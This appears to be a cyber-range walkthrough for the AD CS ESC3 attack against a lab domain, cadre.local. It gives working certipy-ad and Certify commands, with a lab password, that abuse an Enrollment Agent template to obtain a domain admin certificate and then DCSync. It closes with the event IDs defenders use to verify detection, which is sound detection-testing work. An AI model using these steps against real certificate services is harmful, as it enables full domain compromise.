# WT#052 — ESC3: Certificate Request Agent

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC3-Agent + CADRE-ESC3-Target |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, Certify |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC3-Agent` template published with Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)
- `CADRE-ESC3-Target` template published with enrollee-supplies-subject
- `analyst_dfir` has Enroll on both templates

## Attack Steps

### 1. Enumerate ESC3 templates
```powershell
Certify.exe find /ca:dc01.cadre.local\cadre-CA /template:CADRE-ESC3-Agent
Certify.exe find /ca:dc01.cadre.local\cadre-CA /template:CADRE-ESC3-Target
```

### 2. Step 1 — Enroll the Agent certificate
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC3-Agent -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Step 2 — Use Agent cert to request on-behalf-of (OBO) as DA
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC3-Target -upn chief_command@cadre.local -pfx analyst_dfir.pfx -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 4. Authenticate as DA and DCSync
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC3 Agent cert → OBO request → DA certificate → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: Two certificate requests (Agent then Target OBO)
- **Event 4889**: Two certificates issued
- **Event 5136**: Directory service object modification (UPN write)
- **Sysmon Event 1**: certipy-ad / Certify process chain
## Status
CONFIGURED — CA cadre-CA running, ESC3-Agent + ESC3-Target published
